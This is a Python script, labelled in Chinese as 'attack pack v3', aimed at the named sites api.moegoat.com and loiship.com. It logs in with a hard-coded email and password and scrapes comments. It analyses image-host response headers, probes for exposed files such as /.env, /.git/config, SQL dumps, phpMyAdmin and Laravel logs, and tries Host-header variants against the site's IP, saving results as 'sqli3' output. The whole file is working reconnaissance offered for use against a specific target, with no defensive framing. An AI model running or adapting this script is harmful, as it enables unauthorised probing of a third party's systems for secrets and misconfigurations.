# -*- coding: utf-8 -*-
"""攻击包 v3: 评论挖掘 + 响应头分析 + 备份探测 + Host 变体"""

import urllib.request, urllib.parse, json, time, sys, ssl

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
out = []


def log(s):
    print(s, flush=True)
    out.append(str(s))


def req_full(method, path, data=None, headers=None, timeout=12):
    h = {
        "User-Agent": UA,
        "Origin": "https://loiship.com",
        "Referer": "https://loiship.com/",
    }
    if headers:
        h.update(headers)
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        h["Content-Type"] = "application/json"
    r = urllib.request.Request(
        "https://api.moegoat.com" + path, data=body, headers=h, method=method
    )
    ctx = ssl.create_default_context()
    try:
        resp = urllib.request.urlopen(r, timeout=timeout, context=ctx)
        hdrs = dict(resp.headers)
        return resp.status, resp.read().decode("utf-8", "replace"), hdrs
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")[:300], dict(e.headers)
    except Exception as e:
        return "EXC", type(e).__name__, {}


shard = int(sys.argv[1]) if len(sys.argv) > 1 else 1
res = []

st, body, hdrs = req_full(
    "POST", "/api/user/login", {"email": "3124323585@qq.com", "password": "9876543210."}
)
tok = ""
if st == 200:
    tok = (json.loads(body).get("access_token") or "").replace("bearer ", "")
H = {"Authorization": "Bearer " + tok}
log("login: %s" % st)
time.sleep(1)

# 1. 评论挖掘 (热门条目)
log("=== 评论挖掘 ===")
for lid in [6422, 6421, 6420, 6419, 6269, 6365]:
    st, b, hdrs = req_full("GET", "/api/comment/%d?page=1&sort=new" % lid, headers=H)
    res.append({"t": "comment-%d" % lid, "s": st, "b": b[:500]})
    log("comment %d: %s %s" % (lid, st, b[:120].replace("\n", " ")))
    time.sleep(0.4)

# 2. cover 302/响应头分析
log("=== cover 响应头 ===")
st, b, hdrs = req_full(
    "GET",
    "https://images.moegoat.com/HffjWfqcYwQMXlWaFidl3BkFPVwO3TS6pfadK6ST.jpg",
    headers={"User-Agent": UA, "Referer": "https://loiship.com/"},
)
res.append(
    {
        "t": "cover-hdrs",
        "s": st,
        "h": {
            k: v
            for k, v in hdrs.items()
            if k.lower()
            in (
                "location",
                "server",
                "x-cache",
                "cf-ray",
                "content-type",
                "x-amz-",
                "etag",
            )
        },
    }
)
log(
    "cover: %s %s"
    % (
        st,
        {
            k: v
            for k, v in hdrs.items()
            if k.lower() in ("location", "server", "x-cache", "x-amz-")
        },
    )
)
time.sleep(0.3)

# 3. api 备份/配置文件探测
log("=== 备份探测 ===")
for pp in [
    "/.env",
    "/.git/config",
    "/backup.zip",
    "/backup.sql",
    "/db.sql",
    "/dump.sql",
    "/adminer.php",
    "/phpmyadmin/",
    "/api/.env",
    "/public/.env",
    "/storage/logs/laravel.log",
    "/index.php",
    "/vendor/",
    "/composer.json",
    "/package.json",
    "/config.php",
    "/install.php",
    "/api/v1/config",
    "/api/debug",
    "/api/health",
    "/debug",
]:
    st, b, hdrs = req_full("GET", pp)
    res.append({"t": "bkp-" + pp, "s": st, "b": b[:150]})
    log("bkp %s: %s %s" % (pp, st, b[:60].replace("\n", " ")))
    time.sleep(0.3)

# 4. Host 头变体 (用 api IP + 不同 Host)
log("=== Host 变体 ===")
import socket

try:
    ip = socket.gethostbyname("api.moegoat.com")
except Exception:
    ip = "104.21.10.3"
for host in [
    "loiship.com",
    "loix.cc",
    "api.loiship.com",
    "images.moegoat.com",
    "moegoat.com",
]:
    url = "https://%s/api/lois?page=1" % ip
    r = urllib.request.Request(
        url, headers={"User-Agent": UA, "Host": host, "Origin": "https://loiship.com"}
    )
    ctx = ssl.create_default_context()
    try:
        resp = urllib.request.urlopen(r, timeout=10, context=ctx)
        data = resp.read(150).decode("utf-8", "replace")
        res.append({"t": "host-" + host, "s": resp.status, "b": data[:100]})
        log("host %s: %s %s" % (host, resp.status, data[:60]))
    except urllib.error.HTTPError as e:
        res.append({"t": "host-" + host, "s": e.code, "b": ""})
        log("host %s: %s" % (host, e.code))
    except Exception as e:
        res.append({"t": "host-" + host, "s": "EXC", "b": type(e).__name__})
        log("host %s: EXC %s" % (host, type(e).__name__))
    time.sleep(0.3)

with open("sqli3_%d.jsonl" % shard, "w", encoding="utf-8") as f:
    for r in res:
        f.write(json.dumps(r, ensure_ascii=False) + "\n")
with open("sqli3_%d.txt" % shard, "w", encoding="utf-8") as f:
    f.write("\n".join(out))
log("v3 shard%d done" % shard)
